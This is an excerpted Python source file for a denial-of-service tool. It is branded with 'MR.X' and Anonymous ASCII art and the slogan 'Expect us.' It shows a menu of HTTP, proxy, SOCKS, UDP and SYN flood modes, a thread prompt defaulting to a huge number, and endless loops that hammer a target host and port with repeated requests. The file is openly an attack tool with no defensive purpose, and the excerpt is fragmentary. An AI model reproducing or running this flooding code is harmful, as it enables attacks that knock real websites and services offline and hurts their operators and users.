...
def logo():
 ...
 __  __ _   _ ____ _____ _____ ____    ____  ____   ___  ____  
|  \/  | | | / ___|_   _| ____|  _ \  |  _ \|  _ \ / _ \/ ___| 
| |\/| | | | \___ \ | | |  _| | |_) | | | | | | | | | | \___ \ 
| |  | | |_| |___) || | | |___|  _ <  | |_| | |_| | |_| |___) |
|_|  |_|\___/|____/ |_| |_____|_| \_\ |____/|____/ \___/|____/ 
  ...
  _   _ _  _    ____ _  _______ ____    ___ _____   ________  _   _ _____ 
...
```````¶¶¶¶¶¶0¶¶¶-------{MR.X}-------000000000000¶011`
``````_¶¶¶¶¶¶¶¶¶00000000000000000000000000000011_111```
``````0¶¶0¶¶¶0¶¶---{Hack The Planet}---00000¶01`1_11_``
...
|_|  |_|\___/|____/ |_| |_____|_| \_\ |____/|____/ \___/|____/ 
		  ...
		  / _ \ | |   | | / _ \| |   | | / 
		 / ___ \| |   | |/ ___ \ |___| | \ 
		/_/   \_\_|   |_/_/   \_\____|_|\_\___{MR.X}___
                                                               |
"We are Anonymous,We are Legion,We do not forgive,We do not forget,Expect us."

	[+]=====[ Layer 7 ]=====[+]=======[ Layer 4 ]========[+]
	 0: Home      [ HOME ]   |     5: UDP_Flood     [ Home ]
	 1: Proxy     [ DDoS ]   |     6: TCP_SYN_Flood [ DDos ] 
	 2: Socks High[ DDoS ]   |                         
	 3: JS_Normal [ Home ]   |         {select to_number}                       
	 4: Raw_DoS   [ Home ]   |                         
	[+]==================================================[+]
""")
...
def choice_method_attack():
    ...
    method_attack = input("[*] Choice Your Request [1/2]: ")
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("[*] Threads Up To [1000000000000000000000000000000000000000]: "))
    except ValueError:
        threads = int(1000000000000000000000000000000000000000)
        ...
        while True:
            try:
                if method_attack == "1":
                    ...
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("[+] H4CK3R Send >>> | Raw-DoS @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                #sys.stdout.flush()
                print("[!] H4CK3R Send >>> | Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[!] H4CK3R Send >>> | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                ...
                try:
                    ...
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("[!] H4CK3R Send >>> | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("[+] H4CK3R Send >>> | Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                print("[+] H4CK3R Send >>> | JS-Normal @ " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
